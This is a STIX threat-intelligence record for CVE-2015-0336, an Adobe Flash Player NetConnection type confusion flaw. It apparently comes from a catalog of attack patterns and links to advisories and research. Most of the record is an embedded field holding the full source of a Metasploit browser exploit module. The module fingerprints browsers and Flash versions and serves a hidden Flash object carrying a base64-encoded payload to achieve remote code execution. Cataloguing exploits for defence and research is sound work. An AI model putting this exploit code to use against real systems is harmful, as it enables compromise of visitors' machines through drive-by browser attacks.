{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9fd065d-3a4e-48b8-994e-39c267787a4d",
    "created": "2024-08-14T17:05:37.924415Z",
    "modified": "2024-08-14T17:05:37.924419Z",
    "name": "Adobe Flash Player NetConnection Type Confusion",
    "description": " This module exploits a type confusion vulnerability in the NetConnection class on Adobe Flash Player. When using a correct memory layout this vulnerability allows to corrupt arbitrary memory. It can be used to overwrite dangerous objects, like vectors, and ultimately accomplish remote code execution. This module has been tested successfully on: * Windows 7 SP1 (32-bit), IE 8, IE11 and Adobe Flash 16.0.0.305. * Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 16.0.0.305. * Windows 8.1, Firefox 38.0.5 and Adobe Flash 16.0.0.305. * Linux Mint \"Rebecca\" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.424. * Ubuntu 14.04.2 LTS, Firefox 33.0 and Adobe Flash 11.2.202.442.  'License'             => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/adobe_flash_net_connection_confusion.rb",
            "external_id": "adobe_flash_net_connection_confusion.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0336"
        },
        {
            "source_name": "reference",
            "url": "https://helpx.adobe.com/security/products/flash-player/apsb15-05.html"
        },
        {
            "source_name": "reference",
            "url": "http://googleprojectzero.blogspot.com/2015/04/a-tale-of-two-exploits.html"
        },
        {
            "source_name": "reference",
            "url": "http://malware.dontneedcoffee.com/2015/03/cve-2015-0336-flash-up-to-1600305-and.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2015/03/cve-2015-0336_nuclea.html"
        },
        {
            "source_name": "reference",
            "url": "https://blog.malwarebytes.org/exploits-2/2015/03/nuclear-ek-leverages-recently-patched-flash-vulnerability/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'                => 'Adobe Flash Player NetConnection Type Confusion',\n      'Description'         => %q{\n        This module exploits a type confusion vulnerability in the NetConnection class on\n        Adobe Flash Player. When using a correct memory layout this vulnerability allows\n        to corrupt arbitrary memory. It can be used to overwrite dangerous objects, like\n        vectors, and ultimately accomplish remote code execution. This module has been tested\n        successfully on:\n        * Windows 7 SP1 (32-bit), IE 8, IE11 and Adobe Flash 16.0.0.305.\n        * Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 16.0.0.305.\n        * Windows 8.1, Firefox 38.0.5 and Adobe Flash 16.0.0.305.\n        * Linux Mint \"Rebecca\" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.424.\n        * Ubuntu 14.04.2 LTS, Firefox 33.0 and Adobe Flash 11.2.202.442.\n      },\n      'License'             => MSF_LICENSE,\n      'Author'              =>\n        [\n          'Natalie Silvanovich', # Vulnerability discovery and Google Project Zero Exploit\n          'Unknown', # Exploit in the wild\n          'juan vazquez' # msf module\n        ],\n      'References'          =>\n        [\n          ['CVE', '2015-0336'],\n          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb15-05.html'],\n          ['URL', 'http://googleprojectzero.blogspot.com/2015/04/a-tale-of-two-exploits.html'],\n          ['URL', 'http://malware.dontneedcoffee.com/2015/03/cve-2015-0336-flash-up-to-1600305-and.html'],\n          ['URL', 'https://www.fireeye.com/blog/threat-research/2015/03/cve-2015-0336_nuclea.html'],\n          ['URL', 'https://blog.malwarebytes.org/exploits-2/2015/03/nuclear-ek-leverages-recently-patched-flash-vulnerability/']\n        ],\n      'Payload'             =>\n        {\n          'DisableNops' => true\n        },\n      'Platform'            => ['win', 'linux'],\n      'Arch'                => [ARCH_X86],\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :arch    => ARCH_X86,\n          :os_name => lambda do |os|\n            os =~ OperatingSystems::Match::LINUX ||\n              os =~ OperatingSystems::Match::WINDOWS_7 ||\n              os =~ OperatingSystems::Match::WINDOWS_81\n          end,\n          :ua_name => lambda do |ua|\n            case target.name\n            when 'Windows'\n              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF\n            when 'Linux'\n              return true if ua == Msf::HttpClients::FF\n            end\n\n            false\n          end,\n          :flash   => lambda do |ver|\n            case target.name\n            when 'Windows'\n              return true if ver =~ /^16\\./ && Rex::Version.new(ver) <= Rex::Version.new('16.0.0.305')\n            when 'Linux'\n              return true if ver =~ /^11\\./ && Rex::Version.new(ver) <= Rex::Version.new('11.2.202.442')\n            end\n\n            false\n          end\n        },\n      'Targets'             =>\n        [\n          [ 'Windows',\n            {\n              'Platform' => 'win'\n            }\n          ],\n          [ 'Linux',\n            {\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'Privileged'          => false,\n      'DisclosureDate'      => '2015-03-12',\n      'DefaultTarget'       => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n    @trigger = create_trigger\n\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status('Sending SWF...')\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status('Sending HTML...')\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    target_payload = get_payload(cli, target_info)\n    b64_payload = Rex::Text.encode_base64(target_payload)\n    os_name = target_info[:os_name]\n\n    if target.name =~ /Windows/\n      platform_id = 'win'\n    elsif target.name =~ /Linux/\n      platform_id = 'linux'\n    end\n\n    trigger_hex_stream = @trigger.unpack('H*')[0]\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>&tr=<%=trigger_hex_stream%>\" />\n    <param name=\"Play\" value=\"true\" />\n    <embed type=\"application/x-shockwave-flash\" width=\"1\" height=\"1\" src=\"<%=swf_random%>\" allowScriptAccess=\"always\" FlashVars=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>&tr=<%=trigger_hex_stream%>\" Play=\"true\"/>\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0336', 'msf.swf')\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\n\n  def create_trigger\n    if target.name =~ /Linux/\n      path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0336', 'trigger_linux.swf')\n    else\n      path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0336', 'trigger.swf')\n    end\n\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-12",
    "x_mitre_platforms": [
        "linux"
    ]
}